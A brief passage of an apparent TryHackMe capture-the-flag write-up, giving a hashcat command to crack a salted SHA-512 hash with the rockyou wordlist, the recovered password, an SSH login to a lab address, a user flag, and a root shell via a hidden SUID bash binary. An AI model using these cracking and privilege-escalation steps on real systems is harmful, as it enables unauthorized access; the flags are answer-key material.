...
Add salt at the end like hash:salt ,hash is sha-512 so:
```
hashcat -m 1710 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt
```

so is password : november16
...
- ssh -p 2222 james@10.10.238.198
- thm{d119b4fa8c497ddb0525f7ad200e6567}

What's the root flag?
- .suid_bash spawn shell with root privileges
- ./.suid_bash -p
